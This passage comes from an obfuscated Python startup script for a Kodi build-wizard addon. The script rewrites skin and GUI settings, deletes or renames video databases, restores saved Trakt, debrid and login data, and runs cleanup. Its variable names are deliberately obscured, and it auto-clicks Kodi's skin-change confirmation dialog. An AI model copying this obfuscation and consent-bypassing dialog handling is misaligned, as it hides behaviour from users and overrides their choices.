			OO00O0O00O0O0000O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:575
			OOOOO00O0OOO000O0 =re .compile (OO00O0O00O0O0000O ).findall (O0OOO00O0O0O000OO )[0 ]#line:576
			OO00O0OO0O000O00O =open (O00000OOOO0O00OO0 ,'w')#line:577
			OO00O0OO0O000O00O .write (O0OOO00O0O0O000OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOOO00O0OOO000O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:578
			OO00O0OO0O000O00O .close ()#line:579
		except :#line:580
				pass #line:581
		wiz .kodi17Fix ()#line:582
		O00000OOOO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:583
		try :#line:584
			OO00O0OO0O000O00O =open (O00000OOOO0O00OO0 ,'r')#line:585
			O0OOO00O0O0O000OO =OO00O0OO0O000O00O .read ()#line:586
			OO00O0OO0O000O00O .close ()#line:587
			OO00O0O00O0O0000O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:588
			OOOOO00O0OOO000O0 =re .compile (OO00O0O00O0O0000O ).findall (O0OOO00O0O0O000OO )[0 ]#line:589
			OO00O0OO0O000O00O =open (O00000OOOO0O00OO0 ,'w')#line:590
			OO00O0OO0O000O00O .write (O0OOO00O0O0O000OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOOO00O0OOO000O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:591
			OO00O0OO0O000O00O .close ()#line:592
		except :#line:593
				pass #line:594
		swapSkins ('skin.Premium.mod')#line:595
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:596
	os ._exit (1 )#line:597
def fix18update ():#line:598
	if KODIV >=18 :#line:599
		xbmc .sleep (4000 )#line:600
		if BUILDNAME =="":#line:601
			try :#line:602
				os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:603
			except :#line:604
				pass #line:605
		try :#line:606
			O0O0000000000000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:607
			O0O0OO0OOO0O00O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:608
			os .rename (O0O0000000000000O ,O0O0OO0OOO0O00O0O )#line:609
		except :#line:610
				pass #line:611
		skindialogsettind18 ()#line:612
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:613
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:614
		fixfont ()#line:615
		O0OO0OOOOO0OOOOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:616
		try :#line:617
			O0O000000OO0OOOOO =open (O0OO0OOOOO0OOOOO0 ,'r')#line:618
			O0OOOO0O00OOOOOOO =O0O000000OO0OOOOO .read ()#line:619
			O0O000000OO0OOOOO .close ()#line:620
			OO0OOOO0OOOO0O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:621
			OO00OOO00OOO000O0 =re .compile (OO0OOOO0OOOO0O0O0 ).findall (O0OOOO0O00OOOOOOO )[0 ]#line:622
			O0O000000OO0OOOOO =open (O0OO0OOOOO0OOOOO0 ,'w')#line:623
			O0O000000OO0OOOOO .write (O0OOOO0O00OOOOOOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO00OOO00OOO000O0 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:624
			O0O000000OO0OOOOO .close ()#line:625
		except :#line:626
				pass #line:627
		wiz .kodi17Fix ()#line:628
		O0OO0OOOOO0OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:629
		try :#line:630
			O0O000000OO0OOOOO =open (O0OO0OOOOO0OOOOO0 ,'r')#line:631
			O0OOOO0O00OOOOOOO =O0O000000OO0OOOOO .read ()#line:632
			O0O000000OO0OOOOO .close ()#line:633
			OO0OOOO0OOOO0O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:634
			OO00OOO00OOO000O0 =re .compile (OO0OOOO0OOOO0O0O0 ).findall (O0OOOO0O00OOOOOOO )[0 ]#line:635
			O0O000000OO0OOOOO =open (O0OO0OOOOO0OOOOO0 ,'w')#line:636
			O0O000000OO0OOOOO .write (O0OOOO0O00OOOOOOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO00OOO00OOO000O0 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:637
			O0O000000OO0OOOOO .close ()#line:638
		except :#line:639
				pass #line:640
		swapSkins ('skin.Premium.mod')#line:641
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:642
	os ._exit (1 )#line:643
def swapSkins (O0O000O0O00O00O0O ,title ="Error"):#line:644
	O000O00OO0O0OOOOO ='lookandfeel.skin'#line:645
	O00OO0OOOO00OOO0O =O0O000O0O00O00O0O #line:646
	O0O0OOOOO0O0O0000 =getOld (O000O00OO0O0OOOOO )#line:647
	O00OOOO0000O0O0O0 =O000O00OO0O0OOOOO #line:648
	setNew (O00OOOO0000O0O0O0 ,O00OO0OOOO00OOO0O )#line:649
	OO0O00O000OO00O0O =0 #line:650
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O00O000OO00O0O <100 :#line:651
		OO0O00O000OO00O0O +=1 #line:652
		xbmc .sleep (1 )#line:653
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:654
		xbmc .executebuiltin ('SendClick(11)')#line:655
	return True #line:656
def getOld (OOOO0OOO0000OO000 ):#line:658
	try :#line:659
		OOOO0OOO0000OO000 ='"%s"'%OOOO0OOO0000OO000 #line:660
		O00OO0O0O000000OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOO0OOO0000OO000 )#line:661
		O00O0OOOO0O00OO00 =xbmc .executeJSONRPC (O00OO0O0O000000OO )#line:663
		O00O0OOOO0O00OO00 =simplejson .loads (O00O0OOOO0O00OO00 )#line:664
		if O00O0OOOO0O00OO00 .has_key ('result'):#line:665
			if O00O0OOOO0O00OO00 ['result'].has_key ('value'):#line:666
				return O00O0OOOO0O00OO00 ['result']['value']#line:667
	except :#line:668
		pass #line:669
	return None #line:670
def setNew (OOOOOOO0OO0000OOO ,O000OOO0O0O0OOO0O ):#line:673
	try :#line:674
		OOOOOOO0OO0000OOO ='"%s"'%OOOOOOO0OO0000OOO #line:675
		O000OOO0O0O0OOO0O ='"%s"'%O000OOO0O0O0OOO0O #line:676
		OO0O0OO0O0O0OO0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOOOOO0OO0000OOO ,O000OOO0O0O0OOO0O )#line:677
		O0OOOO0OO0000O000 =xbmc .executeJSONRPC (OO0O0OO0O0O0OO0OO )#line:679
	except :#line:680
		pass #line:681
	return None #line:682
def idle ():#line:683
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:684
def fixfont ():#line:685
	OO0O000OO0OOO000O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:686
	O000OOOO0O000OOO0 =json .loads (OO0O000OO0OOO000O );#line:688
	OO0OO000OOOO0O0OO =O000OOOO0O000OOO0 ["result"]["settings"]#line:689
	O0OO0O000OOOO00OO =[O0OO0O0O0O0O00O00 for O0OO0O0O0O0O00O00 in OO0OO000OOOO0O0OO if O0OO0O0O0O0O00O00 ["id"]=="audiooutput.audiodevice"][0 ]#line:691
	OOO000OO0O0O0OO0O =O0OO0O000OOOO00OO ["options"];#line:692
	OOO0OO0OO0000O00O =O0OO0O000OOOO00OO ["value"];#line:693
	OOOO00O0OO0OOOOOO =[OOO0O0OO00OO0OO00 for (OOO0O0OO00OO0OO00 ,O000000O0OOO0O0O0 )in enumerate (OOO000OO0O0O0OO0O )if O000000O0OOO0O0O0 ["value"]==OOO0OO0OO0000O00O ][0 ];#line:695
	OOOO0OO00OOO0OO00 =(OOOO00O0OO0OOOOOO +1 )%len (OOO000OO0O0O0OO0O )#line:697
	OO0O00OO00OO0O000 =OOO000OO0O0O0OO0O [OOOO0OO00OOO0OO00 ]["value"]#line:699
	O00OOO00O0O00000O =OOO000OO0O0O0OO0O [OOOO0OO00OOO0OO00 ]["label"]#line:700
	OOO0O00OOOO0O0OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:702
	try :#line:704
		O0O000OO0OO0OO00O =json .loads (OOO0O00OOOO0O0OO0 );#line:705
		if O0O000OO0OO0OO00O ["result"]!=True :#line:707
			raise Exception #line:708
	except :#line:709
		sys .stderr .write ("Error switching audio output device")#line:710
		raise Exception #line:711
def checkSkin ():#line:714
	wiz .log ("[Build Check] Invalid Skin Check Start")#line:715
	OOOOOOO000O0OO00O =wiz .getS ('defaultskin')#line:716
	O00OOO00OO0O00OO0 =wiz .getS ('defaultskinname')#line:717
	O0O0O00O0OO00O0OO =wiz .getS ('defaultskinignore')#line:718
	O0O0OOOOOO00O00OO =False #line:719
	if not OOOOOOO000O0OO00O =='':#line:720
		if os .path .exists (os .path .join (ADDONS ,OOOOOOO000O0OO00O )):#line:721
			if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to set the skin back to:[/COLOR]",'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OOO00OO0O00OO0 )):#line:722
				O0O0OOOOOO00O00OO =OOOOOOO000O0OO00O #line:723
				O000000O0OO00O00O =O00OOO00OO0O00OO0 #line:724
			else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true');O0O0OOOOOO00O00OO =False #line:725
		else :wiz .setS ('defaultskin','');wiz .setS ('defaultskinname','');OOOOOOO000O0OO00O ='';O00OOO00OO0O00OO0 =''#line:726
	if OOOOOOO000O0OO00O =='':#line:727
		OOO000OO0000O0000 =[]#line:728
		OO00O00O000OOO0OO =[]#line:729
		for O000OO000O0O00O00 in glob .glob (os .path .join (ADDONS ,'skin.*/')):#line:730
			OOOOOOO0OOO0O0O0O ="%s/addon.xml"%O000OO000O0O00O00 #line:731
			if os .path .exists (OOOOOOO0OOO0O0O0O ):#line:732
				OOOO00000000O00O0 =open (OOOOOOO0OOO0O0O0O ,mode ='r');OO0OO00O0000O00O0 =OOOO00000000O00O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','');OOOO00000000O00O0 .close ();#line:733
				O0OOO00OOO00OO00O =wiz .parseDOM (OO0OO00O0000O00O0 ,'addon',ret ='id')#line:734
				OO0O0OOO0OOO00OOO =wiz .parseDOM (OO0OO00O0000O00O0 ,'addon',ret ='name')#line:735
				wiz .log ("%s: %s"%(O000OO000O0O00O00 ,str (O0OOO00OOO00OO00O [0 ])),xbmc .LOGNOTICE )#line:736
				if len (O0OOO00OOO00OO00O )>0 :OO00O00O000OOO0OO .append (str (O0OOO00OOO00OO00O [0 ]));OOO000OO0000O0000 .append (str (OO0O0OOO0OOO00OOO [0 ]))#line:737
				else :wiz .log ("ID not found for %s"%O000OO000O0O00O00 ,xbmc .LOGNOTICE )#line:738
			else :wiz .log ("ID not found for %s"%O000OO000O0O00O00 ,xbmc .LOGNOTICE )#line:739
		if len (OO00O00O000OOO0OO )>0 :#line:740
			if len (OO00O00O000OOO0OO )>1 :#line:741
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to view a list of avaliable skins?[/COLOR]"):#line:742
					O0OOO0OO0O000000O =DIALOG .select ("Select skin to switch to!",OOO000OO0000O0000 )#line:743
					if O0OOO0OO0O000000O ==-1 :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:744
					else :#line:745
						O0O0OOOOOO00O00OO =OO00O00O000OOO0OO [O0OOO0OO0O000000O ]#line:746
						O000000O0OO00O00O =OOO000OO0000O0000 [O0OOO0OO0O000000O ]#line:747
				else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:748
	if O0O0OOOOOO00O00OO :#line:755
		skinSwitch .swapSkins (O0O0OOOOOO00O00OO )#line:756
		O000OO000000O0OOO =0 #line:757
		xbmc .sleep (1000 )#line:758
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OO000000O0OOO <150 :#line:759
			O000OO000000O0OOO +=1 #line:760
			xbmc .sleep (200 )#line:761
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:763
			wiz .ebi ('SendClick(11)')#line:764
			wiz .lookandFeelData ('restore')#line:765
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Skin Swap Timed Out![/COLOR]'%COLOR2 )#line:766
	wiz .log ("[Build Check] Invalid Skin Check End",xbmc .LOGNOTICE )#line:767
while xbmc .Player ().isPlayingVideo ():#line:769
	xbmc .sleep (1000 )#line:770
if KODIV >=17 :#line:772
	NOW =datetime .now ()#line:773
	temp =wiz .getS ('kodi17iscrap')#line:774
	if not temp =='':#line:775
		if temp >str (NOW -timedelta (minutes =2 )):#line:776
			wiz .log ("Killing Start Up Script")#line:777
			sys .exit ()#line:778
	wiz .log ("%s"%(NOW ))#line:779
	wiz .setS ('kodi17iscrap',str (NOW ))#line:780
	xbmc .sleep (1000 )#line:781
	if not wiz .getS ('kodi17iscrap')==str (NOW ):#line:782
		wiz .log ("Killing Start Up Script")#line:783
		sys .exit ()#line:784
	else :#line:785
		wiz .log ("Continuing Start Up Script")#line:786
wiz .log ("[Path Check] Started",xbmc .LOGNOTICE )#line:788
path =os .path .split (ADDONPATH )#line:789
if not ADDONID ==path [1 ]:DIALOG .ok (ADDONTITLE ,'[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]'%COLOR2 ,'[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,ADDONID ),'[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,path ));wiz .log ("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s "%(ADDONID ,path ))#line:790
else :wiz .log ("[Path Check] Good!",xbmc .LOGNOTICE )#line:791
if KODIADDONS in ADDONPATH :#line:794
	wiz .log ("Copying path to addons dir",xbmc .LOGNOTICE )#line:795
	if not os .path .exists (ADDONS ):os .makedirs (ADDONS )#line:796
	newpath =xbmc .translatePath (os .path .join ('special://home/addons/',ADDONID ))#line:797
	if os .path .exists (newpath ):#line:798
		wiz .log ("Folder already exists, cleaning House",xbmc .LOGNOTICE )#line:799
		wiz .cleanHouse (newpath )#line:800
		wiz .removeFolder (newpath )#line:801
	try :#line:802
		wiz .copytree (ADDONPATH ,newpath )#line:803
	except Exception as e :#line:804
		pass #line:805
	wiz .forceUpdate (True )#line:806
try :#line:808
	mybuilds =xbmc .translatePath (MYBUILDS )#line:809
	if not os .path .exists (mybuilds ):xbmcvfs .mkdirs (mybuilds )#line:810
except :#line:811
	pass #line:812
wiz .log ("[Installed Check] Started",xbmc .LOGNOTICE )#line:814
if KODIV >=17 and SKIN in ['skin.confluence','skin.estuary','skin.estouchy']and not BUILDNAME =="":#line:818
			wiz .kodi17Fix ()#line:819
			fix18update ()#line:820
			fix17update ()#line:821
if INSTALLED =='true':#line:824
    input =(ADDON .getSetting ("rdbuild"))#line:825
    if KEEPTRAKT =='true':traktit .traktIt ('restore','all');wiz .log ('[Installed Check] Restoring Trakt Data',xbmc .LOGNOTICE )#line:827
    if KEEPREAL =='true':debridit .debridIt ('restore','all');wiz .log ('[Installed Check] Restoring Real Debrid Data',xbmc .LOGNOTICE )#line:828
    if input =='true':loginit .loginIt ('restore','all');wiz .log ('[Installed Check] Restoring Login Data',xbmc .LOGNOTICE )#line:829
    wiz .clearS ('install')#line:830
wiz .log ("[Notifications] Started",xbmc .LOGNOTICE )#line:915
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:917
	input =(ADDON .getSetting ("autoupdate"))#line:918
	STARTP2 ()#line:919
	if not NOTIFY =='true':#line:920
		url =wiz .workingURL (NOTIFICATION )#line:921
		if url ==True :#line:922
			id ,msg =wiz .splitNotify (NOTIFICATION )#line:923
			if not id ==False :#line:924
				try :#line:925
					id =int (id );NOTEID =int (NOTEID )#line:926
					if id ==NOTEID :#line:927
						if NOTEDISMISS =='false':#line:928
							debridit .debridIt ('update','all')#line:929
							traktit .traktIt ('update','all')#line:930
							checkidupdate ()#line:931
						else :wiz .log ("[Notifications] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:932
					elif id >NOTEID :#line:933
						wiz .log ("[Notifications] id: %s"%str (id ),xbmc .LOGNOTICE )#line:934
						wiz .setS ('noteid',str (id ))#line:935
						wiz .setS ('notedismiss','false')#line:936
						if input =='true':#line:937
							debridit .debridIt ('update','all')#line:938
							traktit .traktIt ('update','all')#line:939
							checkidupdate ()#line:940
						else :notify .notification (msg =msg )#line:941
						wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:942
				except Exception as e :#line:943
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:944
			else :wiz .log ("[Notifications] Text File not formated Correctly")#line:945
		else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,url ),xbmc .LOGNOTICE )#line:946
	else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:947
else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:948
wiz .log ("[Notifications2] Started",xbmc .LOGNOTICE )#line:950
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18":#line:951
	if not NOTIFY2 =='true':#line:952
		url =wiz .workingURL (NOTIFICATION2 )#line:953
		if url ==True :#line:954
			id ,msg =wiz .splitNotify (NOTIFICATION2 )#line:955
			if not id ==False :#line:956
				try :#line:957
					id =int (id );NOTEID2 =int (NOTEID2 )#line:958
					if id ==NOTEID2 :#line:959
						if NOTEDISMISS2 =='false':#line:960
							notify .notification2 (msg )#line:961
						else :wiz .log ("[Notifications2] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:962
					elif id >NOTEID2 :#line:963
						wiz .log ("[Notifications2] id: %s"%str (id ),xbmc .LOGNOTICE )#line:964
						wiz .setS ('noteid2',str (id ))#line:965
						wiz .setS ('notedismiss2','false')#line:966
						notify .notification2 (msg =msg )#line:967
						wiz .log ("[Notifications2] Complete",xbmc .LOGNOTICE )#line:968
				except Exception as e :#line:969
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:970
			else :wiz .log ("[Notifications2] Text File not formated Correctly")#line:971
		else :wiz .log ("[Notifications2] URL(%s): %s"%(NOTIFICATION2 ,url ),xbmc .LOGNOTICE )#line:972
	else :wiz .log ("[Notifications2] Turned Off",xbmc .LOGNOTICE )#line:973
else :wiz .log ("[Notifications2] Not Enabled",xbmc .LOGNOTICE )#line:974
wiz .log ("[Notifications3] Started",xbmc .LOGNOTICE )#line:976
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18"or BUILDNAME ==" Kodi Premium":#line:977
	if not NOTIFY3 =='true':#line:978
		url =wiz .workingURL (NOTIFICATION3 )#line:979
		if url ==True :#line:980
			id ,msg =wiz .splitNotify (NOTIFICATION3 )#line:981
			if not id ==False :#line:982
				try :#line:983
					id =int (id );NOTEID3 =int (NOTEID3 )#line:984
					if id ==NOTEID3 :#line:985
						if NOTEDISMISS3 =='false':#line:986
							notify .notification3 (msg )#line:987
						else :wiz .log ("[Notifications3] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:988
					elif id >NOTEID3 :#line:989
						wiz .log ("[Notifications3] id: %s"%str (id ),xbmc .LOGNOTICE )#line:990
						wiz .setS ('noteid3',str (id ))#line:991
						wiz .setS ('notedismiss3','false')#line:992
						notify .notification3 (msg =msg )#line:993
						wiz .log ("[Notifications3] Complete",xbmc .LOGNOTICE )#line:994
				except Exception as e :#line:995
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:996
			else :wiz .log ("[Notifications3] Text File not formated Correctly")#line:997
		else :wiz .log ("[Notifications3] URL(%s): %s"%(NOTIFICATION3 ,url ),xbmc .LOGNOTICE )#line:998
	else :wiz .log ("[Notifications3] Turned Off",xbmc .LOGNOTICE )#line:999
else :wiz .log ("[Notifications3] Not Enabled",xbmc .LOGNOTICE )#line:1000
wiz .log ("[Trakt Data] Started",xbmc .LOGNOTICE )#line:1001
if KEEPTRAKT =='true':#line:1002
	if TRAKTSAVE <=str (TODAY ):#line:1003
		wiz .log ("[Trakt Data] Saving all Data",xbmc .LOGNOTICE )#line:1004
		traktit .autoUpdate ('all')#line:1005
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:1006
	else :#line:1007
		wiz .log ("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s"%(TRAKTSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1008
else :wiz .log ("[Trakt Data] Not Enabled",xbmc .LOGNOTICE )#line:1009
wiz .log ("[Real Debrid Data] Started",xbmc .LOGNOTICE )#line:1011
if KEEPREAL =='true':#line:1012
	if REALSAVE <=str (TODAY ):#line:1013
		wiz .log ("[Real Debrid Data] Saving all Data",xbmc .LOGNOTICE )#line:1014
		debridit .autoUpdate ('all')#line:1015
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:1016
	else :#line:1017
		wiz .log ("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s"%(REALSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1018
else :wiz .log ("[Real Debrid Data] Not Enabled",xbmc .LOGNOTICE )#line:1019
wiz .log ("[Login Data] Started",xbmc .LOGNOTICE )#line:1021
if KEEPLOGIN =='true':#line:1022
	if LOGINSAVE <=str (TODAY ):#line:1023
		wiz .log ("[Login Data] Saving all Data",xbmc .LOGNOTICE )#line:1024
		loginit .autoUpdate ('all')#line:1025
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:1026
	else :#line:1027
		wiz .log ("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s"%(LOGINSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1028
else :wiz .log ("[Login Data] Not Enabled",xbmc .LOGNOTICE )#line:1029
wiz .log ("[Auto Clean Up] Started",xbmc .LOGNOTICE )#line:1031
if AUTOCLEANUP =='true':#line:1032
	service =False #line:1033
	days =[TODAY ,TOMORROW ,THREEDAYS ,ONEWEEK ]#line:1034
	feq =int (float (AUTOFEQ ))#line:1035
	if AUTONEXTRUN <=str (TODAY )or feq ==0 :#line:1036
		service =True #line:1037
		next_run =days [feq ]#line:1038
		wiz .setS ('nextautocleanup',str (next_run ))#line:1039
	else :wiz .log ("[Auto Clean Up] Next Clean Up %s"%AUTONEXTRUN ,xbmc .LOGNOTICE )#line:1040
	if service ==True :#line:1041
		AUTOCACHE =wiz .getS ('clearcache')#line:1042
		AUTOPACKAGES =wiz .getS ('clearpackages')#line:1043
		AUTOTHUMBS =wiz .getS ('clearthumbs')#line:1044
		if AUTOCACHE =='true':wiz .log ('[Auto Clean Up] Cache: On',xbmc .LOGNOTICE );wiz .clearCache (True )#line:1045
		else :wiz .log ('[Auto Clean Up] Cache: Off',xbmc .LOGNOTICE )#line:1046
		if AUTOTHUMBS =='true':wiz .log ('[Auto Clean Up] Old Thumbs: On',xbmc .LOGNOTICE );wiz .oldThumbs ()#line:1047
		else :wiz .log ('[Auto Clean Up] Old Thumbs: Off',xbmc .LOGNOTICE )#line:1048
		if AUTOPACKAGES =='true':wiz .log ('[Auto Clean Up] Packages: On',xbmc .LOGNOTICE );wiz .clearPackagesStartup ()#line:1049
		else :wiz .log ('[Auto Clean Up] Packages: Off',xbmc .LOGNOTICE )#line:1050
else :wiz .log ('[Auto Clean Up] Turned off',xbmc .LOGNOTICE )#line:1051
wiz .setS ('kodi17iscrap','')#line:1053
for dirpath ,dirnames ,filenames in os .walk (packagesdir ):#line:1122
	count =0 #line:1123
	for f in filenames :#line:1124
		count +=1 #line:1125
		fp =os .path .join (dirpath ,f )#line:1126
		total_size +=os .path .getsize (fp )#line:1127
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1128
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:1135
	for f2 in filenames2 :#line:1136
		fp2 =os .path .join (dirpath2 ,f2 )#line:1137
		total_size2 +=os .path .getsize (fp2 )#line:1138
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1139
if int (total_sizetext2 )>filesize_thumb :#line:1141
	choice2 =xbmcgui .Dialog ().yesno ("[COLOR=red]קודי אנונימוס - ניקוי תמונות פוסטרים ישנות[/COLOR]",'[COLOR red]'+str (total_sizetext2 )+' MB  :גודל התיקיה היא [/COLOR]','מומלץ למחוק את התיקיה בשביל לפנות מקום נוסף במכשיר','האם ברצונך למחוק אותה עכשיו?',yeslabel ='כן',nolabel ='לא')#line:1142
	if choice2 ==1 :#line:1143
		maintenance .deleteThumbnails ()#line:1144
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1146
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1147
if notify_mode =='true':xbmc .executebuiltin ('XBMC.Notification(%s, %s, %s, %s)'%('Maintenance Status','Packages: '+str (total_sizetext )+' MB' ' - Images: '+str (total_sizetext2 )+' MB','5000',iconpath ))#line:1149
time .sleep (3 )#line:1150
